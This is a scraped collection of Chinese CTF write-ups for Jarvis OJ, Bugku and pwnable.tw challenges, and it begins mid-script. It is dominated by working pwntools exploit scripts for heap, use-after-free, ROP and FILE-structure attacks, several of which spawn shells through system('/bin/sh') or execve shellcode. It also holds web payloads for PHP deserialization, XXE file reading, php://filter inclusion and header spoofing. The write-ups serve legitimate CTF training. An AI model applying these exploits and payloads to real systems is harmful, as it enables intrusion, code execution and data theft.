0x80payload += p64(0) + p64(0x91) + "a" * 0x80payload += p64(0) + p64(0x61) + "a" * 0x50New(0x200, payload)#0Delete(1)payload = p64(0x50) + p64(1) + p64(0x200) + p64(heap + 0x20)payload += p64(1) + p64(0x8) + p64(0x602018)payload += p64(1) + p64(0x8) + p64(heap + 0x68) + "/bin/sh\x00"payload = payload.ljust(0x200, "\x00")Edit(0, 0x200, payload)Edit(1, 0x8, p64(libc + libcso.symbols["system"]))#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.sendline("4")r.sendlineafter("Note number: ", str(2))r.interactive() Tell Me Something同[XMAN]level0. Backdoor程序根据命令行参数异或0x6443得出的结果填充字符串,然后附加上backdoor. 所以只需要使backdoor被溢出写到返回地址即可.所以参数为0x24 ^ 0x6443. fm格式化字符串漏洞. 12345678910from pwn import *#r = process("./fm")r = remote("pwn2.jarvisoj.com", "9895")#gdb.attach(r, "b printf")r.send(p32(0x804A02C) + "%11$n")r.interactive() smashes当ELF文件比较小的时候,不同区段可能会被多次映射. 劫持argv[0]即可. 123456789101112from pwn import *#r = process("./smashes")r = remote("pwn.jarvisoj.com", "9877")r.recvuntil("What's your name? ")r.sendline("a" * 0x218 + p64(0x400d20))r.recvuntil("overwrite the flag: ")r.send("\n")print r.recvuntil("terminated") typo一道简单的arm栈溢出. 1234567891011121314from pwn import *pop_r0_r4_pc = 0x20904system = 0x10BA8bin_sh = 0x6c384offset = 112#r = process(["qemu-arm", "./typo"])r = remote("pwn2.jarvisoj.com", "9888")r.sendafter("Input ~ if you want to quit", "\n")payload = "a" * offset + p32(pop_r0_r4_pc) + p32(bin_sh) + p32(0) + p32(system)r.sendafter("------Begin------", payload)r.interactive() Item Boarduaf,先用unsorted bin进行leak,然后通过覆写item结构体劫持控制流. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *def change_ld(binary, ld): binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) return ELF(path)context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']def add(name, len, content): r.sendlineafter("choose:\n", "1") r.sendafter("Item name?\n", name) r.sendlineafter("Description's len?\n", str(len)) r.sendafter("Description?\n", content)def show(index): r.sendlineafter("choose:\n", "3") r.sendlineafter("Which item?\n", str(index))def dele(index): r.sendlineafter("choose:\n", "4") r.sendlineafter("Which item?\n", str(index))elf = change_ld('./itemboard', './ld.so.2')# r = elf.process(env = &#123;"LD_PRELOAD" : "./libc-2.19.so"&#125;)r = remote("pwn2.jarvisoj.com", "9887")add("w4rd3n\n", 0x100, "w4rd3n\n")#0add("w4rd3n\n", 0x60, "w4rd3n\n")#1add("w4rd3n\n", 0x60, "w4rd3n\n")#2dele(0)show(0)r.recvuntil("Description:")libc = u64(r.recvline()[:-1].ljust(8, "\x00")) + 0x7fa272c3c000 - 0x7fa272ffe7b8add("w4rd3n\n", 0x100, "w4rd3n\n")#3 = 0dele(1)dele(2)add("w4rd3n\n", 0x18, "a" * 0x10 + p64(libc + 0x46590)[:6] + "\n")#4 = 2dele(4)add("w4rd3n\n", 0x18, "/bin/sh\n")dele(1)# gdb.attach(r)print "libc: " + hex(libc)r.interactive() WEBPORT511curl --local-port 51 http://web.jarvisoj.com:32770/ LOCALHOST1curl 'http://web.jarvisoj.com:32774/' -H 'X-Forwarded-For:127.0.0.1' Login抓包发现. 1Hint: "select * from `admin` where password='".md5($pass,true)."'" 需要md5后的值字符形式为&#39; or &#39;类似的万能密码.例如md5(ffifdyop, ture) -&gt; 276f7227... == &#39;or&#39;.... 神盾局的秘密查看源代码. 1&lt;img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"&gt; 猜测出通过img参数解码索引文件,验证为base64.读取showimg.php,index.php. 123456789101112131415161718192021222324//showimg.php&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt;//index.php&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x;?&gt; index.php有反序列化漏洞,读取shield.php发现漏洞利用点. 123456789101112131415&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this --&gt;file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; payload. 1view-source:http://web.jarvisoj.com:32768/?class=O:6:%22shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; api调用右键发现是利用ajax发送json数据,Content-Type改为application/xml,xxe即可. 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE file [&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-bugku]]></title>
    <url>%2Fposts%2F254aad4f%2F</url>
    <content type="text"><![CDATA[逆向入门逆向把mov的数值表示成字符获得flag. Easy_vbVB_Decompiler打开看code获得flag(也可IDA看String窗口). Easy_ReIDA打开查看程序逻辑,发现把输入进行比较,比较对象为逆序的flag. 游戏过关OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. 逆向入门IDA打开发现是binary文件,UTF-8查看,发现是Data URL:类似&lt;img src=&quot;{文件数据}&quot;/&gt;. 新建html文件保存打开获得二维码,扫描得flag. WEBweb2F12看源代码获得flag. 计算器F12改minsize = &quot;1&quot;为minsize = &quot;10&quot;获得flag. web基础$_GEThttp://123.206.87.240:8002/get/?what=flag. web基础$_POST 矛盾PHP数字与字符串弱相等==判定. http://123.206.87.240:8002/get/index1.php?num=1a. web3F12,js最后面注释里有html编码,解出flag. 你必须让他停下开抓包软件(Fiddler),第二个response获得flag. 本地包含@$_REQUEST的意思是获得参数,包括@$_GET和@$_POST.使用GET参数返回:Too Young Too Simple. 文件包含http://123.206.87.240:8003/?hello=1);include%20$_GET[%27f%27];//&amp;f=php://filter/convert.base64-encode/resource=flag.php.Base64解码即可. 命令执行http://123.206.87.240:8003/?hello=1);show_source(%27flag.php%27);//. 将flag.php文件读入变量http://123.206.87.240:8003/?hello=file(%27flag.php%27). 变量1匹配任意\w即[A-Za-z0-9_]的字符.$$args,使用全局变量GLOBALS即可. web5F12发现JSFuck,console运行获得flag:ctf{whatfk}.…然而不行,看上面提示可知要大写. 头等舱抓包,看response的header获得flag. welcome to bugkuctf第一步绕过,php可以使用file_get_contents(&quot;php://input&quot;,&#39;r&#39;)读取post数据. 利用文件包含获取hint.php 123456789101112&lt;?phpclass Flag &#123;//flag.php public $file; public function __tostring() &#123; if(isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125;&#125;?&gt; 获取index.php. 12345678910111213141516171819&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf")) &#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file)) &#123; echo "不能现在就给你flag哦"; exit(); &#125; else &#123; include($file); $password = unserialize($password); echo $password; &#125; &#125; else &#123; echo "you are not the number of bugku ! "; &#125;?&gt; 由于php对象在被当作字符串使用时会自动执行__tostring方法,可以利用反序列化漏洞. http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}. flag在index里本地文件包含,http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php.解密得flag. web4查看源代码,URL解码即可. 管理员系统最下面有密码的base64值,通过xff头伪造本地登录. 网站被黑扫目录发现shell.php.爆破密码获得flag. 输入密码查看flag爆破. 点击一百万次查看源代码,直接控制台js构造请求. 123var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;');$('body').append(form);form.submit(); 代码审计extract变量覆盖由于$file的内容大概率不是一个文件名,所以直接利用extract($_GET);把$shiyan设置为空即可. strcmp比较字符串此漏洞适用与5.3之前版本的php,当函数strcmp接受到不能与字符串比较的类型的参数就会发生错误,并返回0.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwnable-tw]]></title>
    <url>%2Fposts%2F7ba23e1a%2F</url>
    <content type="text"><![CDATA[start Linux系统调用号表:位于/usr/include/asm/unistd.h,或者网站. read调用(mov al,3;int 80;)存在栈溢出,返回地址偏移为0x14. 返回地址后即为之前push的esp,返回地址溢出为0x8048087再次打印栈内容leak出esp,再次栈溢出跳到栈上执行shellcode. 利用80h中断中的sys_execve：x31xc9xf7xe1x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xb0x0bxcdx80. 12345678910111213141516171819from pwn import *# r = process("./start")r = remote("chall.pwnable.tw","10000")print r.recv()payload = "a" * 0x14 + p32(0x8048087)r.send(payload)esp = u32(r.recv()[:4])stack = esp + 0x10print "stack:" + hex(stack)payload = "a" * 0x14 + p32(stack + 4)payload += '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'# 这里使用asm(shellcraft.i386.linux.sh())会失败是因为read只有0x3cr.send(payload)r.interactive() orw本题主要考察x86的shellcode编写,程序设置了白名单. 1234567891011121314from pwn import *context.log_level = 'debug'#r = process("./orw")r = remote("chall.pwnable.tw","10001")r.recvuntil("code:")payload = asm(shellcraft.i386.pushstr("/home/orw/flag"))payload += asm(shellcraft.i386.linux.syscall("SYS_open", "esp"))payload += asm(shellcraft.i386.linux.syscall("SYS_read", "eax", 0x804A040, 0x30))payload += asm(shellcraft.i386.linux.syscall("SYS_write", 1, 0x804A040, 0x30))r.send(payload)print r.recv() calc具体漏洞. 当输入为00或者以运算符开头时会时eval时对v1赋值(a2[0]).这样下次eval时就可以任意写,写ROP链即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *r = process("./calc")i = 0def addROP(target): global i r.sendline("+" + str(361 + i)) now = int(r.recv()) if now &lt; target: r.sendline("+" + str(361 + i) + "+" + str(target - now)) else: r.sendline("+" + str(361 + i) + "-" + str(now - target)) print "ROP: " + hex(int(r.recv())) i += 1data = 0x080ec060mov_ret = 0x0809b30d#mov dword ptr [edx], eax ; retint_0x80 = 0x08049a21xoreax_ret = 0x080550d0inceax_ret = 0x0807cb7fpopeax_ret = 0x0805c34bpopebx_ret = 0x080481d1popedx_ret = 0x080701aapopecx_ebx_ret = 0x080701d1r.recvuntil("===\n")addROP(popedx_ret)addROP(data)addROP(popeax_ret)addROP(u32('/bin'))addROP(mov_ret)addROP(popedx_ret)addROP(data + 4)addROP(popeax_ret)addROP(u32('//sh'))addROP(mov_ret)addROP(popedx_ret)addROP(data + 8)addROP(xoreax_ret)addROP(mov_ret)addROP(popecx_ebx_ret)addROP(data + 8)addROP(data)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(int_0x80)r.send('\n')r.interactive() dubblesort在栈空间上排序且没有大小检查,name的读取使用read可以leak. 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = 'debug'#r = process("./dubblesort",env = &#123;"LD_PRELOAD":"./libc_32.so.6"&#125;)r = remote("chall.pwnable.tw","10101")r.recvuntil("name :")r.send("a" * 28)r.recvuntil("a" * 28)libc = u32(r.recvuntil(",")[0:4].ljust(4,"\x00")) - 0x1b0000 + 0x1dbcprint "libc: " + hex(libc)system = libc + 0x3a940shell = libc + 0x158e8bprint r.recvuntil("sort :")r.sendline(str(35))i = 0while(i &lt; 24): r.recvuntil("number : ") r.sendline("0") i += 1r.recvuntil("number : ")r.sendline("+")i += 1while(i &lt; 33): r.recvuntil("number : ") r.sendline(str(system)) i += 1r.recvuntil("number : ")r.sendline(str(shell))r.recvuntil("number : ")r.sendline(str(shell))r.interactive() hacknotefree之后没有清除对应ptr数据,存在uaf. 先泄露libc基址,然后利用prt执行system(&quot;????;sh\0&quot;),利用了system截断参数的特性,也可以&amp;&amp;sh\0等. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *#context.log_level = "debug"#r = process("./hacknote",env = &#123;"LD_PRELOAD":"./libc_32.so.6"&#125;)r = remote("chall.pwnable.tw","10102")r.recvuntil("choice :")def add(size,content): r.send("1") r.recvuntil("Note size :") r.send(str(size)) r.recvuntil("Content :") r.send(content) r.recvuntil("choice :")def dele(index): r.send("2") r.recvuntil("Index :") r.send(str(index)) r.recvuntil("choice :")def prt(index): r.send("3") r.recvuntil("Index :") r.send(str(index)) data = r.recvuntil("choice :") return dataadd(0x80,"0")#0add(0x20,"0")#1dele(0)add(0x20,"0")#2libc = u32(prt(2)[4:8].ljust(4,"\x00")) - 0x1b0830print "libc: " + hex(libc)system = 0x3a940 + libcbinsh = 0x158e8b + libcadd(0xb0,"0")#3dele(1)dele(2)dele(3)add(0x80,"\x66" * 0x50 + p32(system) + ";sh\0")#4# gdb.attach(r)# raw_input("-" * 0x10)r.send("3")r.recvuntil("Index :")r.send("1")r.interactive() silver_bulletpower_up函数中的strncat调用会在字符串后面添加一个&#39;\x00&#39;,当拼接完的字符串长度为0x30时bullet的长度就会被覆盖为0,最后计算出的长度即为本次增加的bullet的长度,产生栈溢出. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#context.log_level = "debug"r = process("./silver_bullet",env = &#123;"LD_PRELOAD":"./libc_32.so.6"&#125;)#r = remote("chall.pwnable.tw","10103")r.recvuntil("choice :")r.send("1\n")r.recvuntil("bullet :")r.send("a" * 0x2f + "\n")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("c")#gdb.attach(r)#input("------------")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("\xff" * 0x3 + "\x11" * 0x4 + p32(0x80484A8) + p32(0x8048954) + p32(0x804AFD0) + "a" * 0x1c)r.recvuntil("choice :")r.send("3\n")r.recvuntil("Oh ! You win !!\n")libc_base = u32(r.recvuntil("+++++\n")[0:4].ljust(4,'\0')) - 0xd41c0print hex(libc_base)r.recvuntil("choice :")r.send("1\n")r.recvuntil("bullet :")r.send("b" * 0x2f + "\n")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("c")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("\xff" * 0x3 + "\x11" * 0x4 + p32(libc_base + 0x3a940) + p32(0x11111111) + p32(libc_base + 0x158e8b) + "b" * 0x1c)r.recvuntil("choice :")r.send("3\n")r.recvuntil("Oh ! You win !!\n")r.interactive() Tcache Tear使用double free修改stdout泄露libc,再次利用修改free_hook成功getshell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *# context.log_level = "debug"# r = process("./tcache_tear")r = remote("chall.pwnable.tw", "10207")r.recvuntil("Name:")r.send(p64(0x602020))r.recvuntil("choice :")def add(size, content): r.send("1") r.recvuntil("Size:") r.send(str(size)) r.recvuntil("Data:") r.send(content) data = r.recvuntil("choice :") return datadef dele(): r.send("2") r.recvuntil("choice :")def info(): r.send("3") data = r.recvuntil("choice :") return dataadd(0x40, "hhhh")dele()dele()add(0x40, p64(0x602060))add(0x40, p64(0))add(0x40, p64(0))add(0x40, p8(0x60))data = add(0x40, p64(0xfbad3887) + p64(0) * 3 + p8(0x88))libc = u64(data[:8]) - 0x3ec760 -0x83print "libc: " + hex(libc)add(0x50, "hhhh")dele()dele()add(0x50, p64(libc + 0x3ed8e8))add(0x50, p64(0))add(0x50, p64(libc + 0x4f440))add(0x20, "/bin/sh\x00")r.send("2")# gdb.attach(r)r.interactive() BabyStack比较密码使用的是strncmp,长度是用户输入的长度,通过登陆状态可以爆破出password,填满储存choice得缓冲区可以爆破出pie地址(没什么用). login和copy函数用的同一片栈区域,虽然copy函数限制了输入字符为0x3f.但因为read_stdin没有截断字符串,可以和login的输入连接从而溢出缓冲区. 由于溢出长度不够考虑使用one_gadget,发现strcpy调用后栈上留有libc地址构造输入使其被下一次strcpy复制到password缓冲区之后,再次爆破得libc地址. 溢出返回地址为one_gadget即可(注意,这里用了return 0). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *from LibcSearcher import *context.log_level = "debug"def login(pwd): r.send("1" + "a" * 15) r.sendafter("Your passowrd :", pwd) data = r.recvuntil("&gt;&gt; ") return datadef logout(): r.send("1" + "a" * 15) r.recvuntil("&gt;&gt; ")def pwn(): r.send("2" + "a" * 15)def copy(content): r.send("3" + "a" * 15) r.sendafter("Copy :", content) r.recvuntil("&gt;&gt; ")#r = process("./babystack", env = &#123;"LD_PRELOAD": "./libc_64.so.6"&#125;)r = remote("chall.pwnable.tw", "10205")r.recvuntil("&gt;&gt; ")password = ""i = 1while 1: if "Success" in login(password + p8(i) + p8(0)): password += p8(i) if len(password) == 16: break i = 1 logout() else: i = i + 1logout()pie = ""i = 1while 1: if "Success" in login(password + "1" + "a" * 15 + pie + p8(i) + p8(0)): pie += p8(i) if len(pie) == 6: break i = 1 logout() else: i = i + 1pie = u64(pie.ljust(8, "\x00")) - 0x1060#gdb.attach(r, "b * " + hex(pie) + " + 0xe43\n" + "b * " + hex(pie) + " + 0xebb\n")logout()login(password + "\x00" * 0x10 + "b" * 0x28)copy("a" * 0x3f)logout()libc = ""i = 1while 1: if "Success" in login("b" * 0x8 + libc + p8(i) + p8(0)): libc += p8(i) if len(libc) == 6: break i = 1 logout() else: i = i + 1libc = u64(libc.ljust(8, "\x00")) - 0x78439success("password: " + password.encode('hex'))success("pie: " + hex(pie))success("libc: " + hex(libc))logout()login("b" * 0x8 + "\x00" * 0x18 + "b" * 0x20 + password + "b" * 0x18 + p64(libc + 0x45216))copy("a" * 0x3f)#gdb.attach(r, "b * " + hex(pie) + " + 0x1052")pwn()r.interactive() seethefile读取/proc/self/maps文件泄露libc. edit溢出file文件指针,伪造file结构体,劫持vtable中的close指针为system即可(结构体除伪造部分都是模仿现有文件指针,避免报错). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *#context.log_level = "debug"libc = ELF('libc_32.so.6')libc_system = libc.symbols['system']libc_binsh = next(libc.search("/bin/sh"))#r = process("./seethefile")r = remote('chall.pwnable.tw', 10200)def Open(name): r.sendline("1") r.recvuntil("see :") r.sendline(name) r.recvuntil("choice :")def Read(): r.sendline("2") r.recvuntil("choice :")def Write(): r.sendline("3") data = r.recvuntil("\n-")[:-2] r.recvuntil("choice :") return datadef Close(): r.sendline("4") r.recvuntil("choice :")def Edit(name): r.sendline("5") r.recvuntil("name :") r.sendline(name)r.recvuntil("choice :")#gdb.attach(r, "b * 0x8048B0F")Open("/proc/self/maps")Read()Read()data = Write()Close()libc = int(data.split("\n")[1].split("-")[0], 16)payload = 0x20 * "\x00"payload += p32(0x804B284) + "/bin/sh\x00" + p32(0) * 0xb + p32(0x804B260) + p32(3) + p32(0) * 3 + p32(0x804b260) + p32(0xffffffff) * 2 + p32(0) + p32(0x804b260) + p32(0) * 14 + p32(0x804B31C) + p32(0) * 2 + p32(0x804B260) * 15 + p32(libc + libc_system) + p32(0x804b260) * 3Edit(payload)sleep(1)r.sendline("./home/seethefile/get_flag")r.recvuntil("magic :")r.sendline("Give me the flag\x00")print r.recv() 3x17动态调试发现main函数就是一个任意写,通过写.fini_array段的两个指针(先调用array[1],再调用array[0])控制程序流程写ROP链,通过leave修改rsp迁移栈. 123456789101112131415161718192021222324252627282930313233from pwn import *r = remote("chall.pwnable.tw", "10105")#r = process('./3x17')def send_data(addr, data): r.recvuntil('addr:') r.sendline(str(addr)) r.recvuntil('data:') r.send(data)fini_array = 0x4B40F0main_func = 0x401B6Dloop_func = 0x402960pop_rax = 0x41e4afpop_rdi = 0x401696pop_rsi = 0x406c30pop_rdx = 0x446e35syscall = 0x471db5main_leave_ret = 0x401C4B#rsp = rbp = 0x4B40f8start = 0x4B4100send_data(fini_array, p64(loop_func) + p64(main_func))send_data(start, p64(pop_rax) + p64(0x3b))send_data(0x4BA9A0, "/bin/sh\x00")send_data(start + 0x10, p64(pop_rdi) + p64(0x4BA9A0))send_data(start + 0x20, p64(pop_rsi) + p64(0))send_data(start + 0x30, p64(pop_rdx) + p64(0))send_data(start + 0x40, p64(syscall))send_data(fini_array, p64(main_leave_ret))r.interactive() Death Note未检测index,got表可改且堆可执行,写shellcode即可. 关于printable shellcode(Printable字符的指ascii码在0x1f和0x7f区间,不包含边界),有以下可用的的gadget. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970; 数据传送push/pop eax...pusha/popa; 算术运算inc/dec eax...sub al, numsub byte ptr [eax... + num], al dl...sub byte ptr [eax... + num], ah dh...sub dword ptr [eax... + num], esi edisub word ptr [eax... + num], si disub al dl..., byte ptr [eax... + num]sub ah dh..., byte ptr [eax... + num]sub esi edi, dword ptr [eax... + num]sub si di, word ptr [eax... + num]; 逻辑运算and al, numand dword ptr [eax... + num], esi ediand word ptr [eax... + num], si diand ah dh..., byte ptr [ecx edx... + num]and esi edi, dword ptr [eax... + num]and si di, word ptr [eax... + num]xor al, numxor byte ptr [eax... + num], al dl...xor byte ptr [eax... + num], ah dh...xor dword ptr [eax... + num], esi edixor word ptr [eax... + num], si dixor al dl..., byte ptr [eax... + num]xor ah dh..., byte ptr [eax... + num]xor esi edi, dword ptr [eax... + num]xor si di, word ptr [eax... + num]; 比较指令cmp al, numcmp byte ptr [eax... + num], al dl...cmp byte ptr [eax... + num], ah dh...cmp dword ptr [eax... + num], esi edicmp word ptr [eax... + num], si dicmp al dl..., byte ptr [eax... + num]cmp ah dh..., byte ptr [eax... + num]cmp esi edi, dword ptr [eax... + num]cmp si di, word ptr [eax... + num]; 转移指令push 56hpop eaxcmp al, 43hjnz lable; &lt;=&gt; jmp lable; 交换al, ahpush eaxxor ah, byte ptr [esp] ; ah ^= alxor byte ptr [esp], ah ; al ^= ahxor ah, byte ptr [esp] ; ah ^= alpop eax; 清零push 44hpop eaxsub al, 44h; eax = 0push esipush esppop eaxxor [eax], esi; esi = 0 观察当前寄存器状态,发现eax为参数,劫持free@got.exp. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'def add(index, name): r.sendline("1") r.sendlineafter("Index :", str(index)) r.sendlineafter("Name :", name) r.recvuntil("Your choice :")def show(index): r.sendline("2") r.sendlineafter("Index :", str(index)) data = r.recvuntil("Your choice :") return datadef dele(index): r.sendline("3") r.sendlineafter("Index :", str(index)) r.recvuntil("Your choice :")#r = process("./death_note")r = remote("chall.pwnable.tw", "10201")r.recvuntil("Your choice :")#gdb.attach(r, "b * 0x8048490")shellcode = ''' push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx /* set ebx to '/bin///sh' */ push 0x60606060 push 0x60606060 /* padding */ push 0x60 pop edx sub byte ptr [eax + 0x32], dl sub byte ptr [eax + 0x33], dl sub byte ptr [eax + 0x33], dl /* set 'int 0x80' */ push 0x6b push 0x56 pop eax sub al, 0x56 push eax push eax pop ecx pop edx pop eax sub al, 0x60 /* set edx = 0, ecx = 0, eax = 0xb */ /* int 0x80 */'''#print len(asm(shellcode))add(-19, asm(shellcode) + "\x2d\x40")#int 0x80 =&gt; \xcd\x80r.sendline("3")r.sendlineafter("Index :", str(-19))r.interactive() BookWriter满足house_of_orange利用条件,不过打远程貌似由于一次性发送payload太长失败. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *context.log_level = 'debug'def add(size, content): r.sendline("1") r.sendlineafter("Size of page :", str(size)) r.sendafter("Content :", content) r.recvuntil("Your choice :")def view(index): r.sendline("2") r.sendlineafter("Index of page :", str(index)) r.recvuntil("Content :\n") data = r.recvuntil("Your choice :") return datadef edit(index, content): r.sendline("3") r.sendlineafter("Index of page :", str(index)) r.sendafter("Content:", content) r.recvuntil("Your choice :")def info(): r.sendline("4") r.recvuntil("Author : ") data = r.recvuntil("Do you want") r.sendlineafter("(yes:1 / no:0) ", str(0)) return data#r = process("./bookwriter")r = process("./bookwriter", env = &#123;"LD_PRELOAD" : "./libc_64.so.6"&#125;)#r = remote("chall.pwnable.tw", "10304")r.sendafter("Author :", "a" * 0x40)r.recvuntil("Your choice :")add(0x108, "a" * 0x108)#0edit(0, "a" * 0x108)heap = u64(info()[0x40:].split("\n")[0].ljust(8, "\x00")) - 0x10#leak heapadd(0x108, "a" * 0x108)#1edit(1, "a" * 0x108)edit(1, "a" * 0x108 + "\xd1\x0d\x00")add(0x1000, "a" * 1)#2add(0x300, "a" * 0x8)#3libc = u64(view(3).split("a" * 0x8)[1][:6].ljust(8 , "\x00")) - 0x3c4178add(0x8, "a" * 0x8)#4add(0x8, "a" * 0x8)#5add(0x8, "a" * 0x8)#6edit(0, "\x00")add(0x8, "a" * 0x8)#7add(0x8, "a" * 0x8)#7payload = "\x00" * 0x108 + p64(0x1011) + p64(0xa30) + p64(0x11111111) * ((0x1000 - 0x8) / 8)payload += p64(0) + p64(0x111) + "a" * 0x108 + p64(0x311) + "\x00" * 0x3a0fake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c4520 - 0x10)#3c4520 D _IO_list_all,fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(1) * 18 + p32(0x80000000) + "a" * 0x14fake_chunk += p64(heap + 0x17e0)fake_chunk = fake_chunk.ljust(0x200, "\x11")payload += fake_chunkpayload += p64(libc + 0x45390) * 0x10edit(0, payload)r.sendline("1")r.sendline("16")#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() 看Tac1t0rnX师傅博客发现一个新的思路:unsorted bin attack修改堆指针为main_arena,修改top chunk任意地址分配,但发现一样会面临之前的问题,payload太长. 又改了半天,远程终于打通,然后发现…本地打不通. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *context.log_level = 'debug'def add(size, content): r.sendline("1") r.sendlineafter("Size of page :", str(size)) r.sendafter("Content :", content) r.recvuntil("Your choice :")def view(index): r.sendline("2") r.sendlineafter("Index of page :", str(index)) r.recvuntil("Content :\n") data = r.recvuntil("Your choice :") return datadef edit(index, content): r.sendline("3") r.sendlineafter("Index of page :", str(index)) r.sendafter("Content:", content) r.recvuntil("Your choice :")def info(): r.sendline("4") r.recvuntil("Author : ") data = r.recvuntil("Do you want") r.sendlineafter("(yes:1 / no:0) ", str(0)) return data#r = process("./bookwriter")#r = process("./bookwriter", env = &#123;"LD_PRELOAD" : "./libc_64.so.6"&#125;)r = remote("chall.pwnable.tw", "10304")r.sendafter("Author :", "a" * 0x40)r.recvuntil("Your choice :")info()add(0x18, "a" * 0x18)#0heap = u64(info()[0x40:].split("\n")[0].ljust(8, "\x00")) - 0x1020#leak heapadd(0x18, "a" * 0x18)#1edit(1, "a" * 0x18)edit(1, "a" * 0x18 + "\xb1\x0f\x00")add(0x1000, "a" * 1)#2#free(top_chunk)add(0x10, "a" * 0x8)#3libc = u64(view(3).split("a" * 0x8)[1][:6].ljust(8 , "\x00")) - 0x3c4188#leak libcadd(0x8, "a" * 0x8)#4add(0x8, "a" * 0x8)#5add(0x8, "a" * 0x8)#6add(0x8, "a" * 0x8)#7edit(0, "\x00")add(0x8, "a" * 0x8)#8#overlop ptr sizepayload = p64(libc + 0x45390) * 0x1e#fake_vtablefake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c4520 - 0x10)#3c4520 D _IO_list_all, 3c5520 D _IO_list_all.#fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(0) * 18 + p32(0xffffffff) + "\x00" * 0x14#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2fake_chunk += p64(heap + 0x1020)#fake_vtable_ptr#fake_chunk &lt;=&gt; fake_IO_FILEpayload += fake_chunkedit(0, payload)edit(0, "\x00")r.sendline("1")r.sendlineafter("Size of page :", str(0x10))#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() 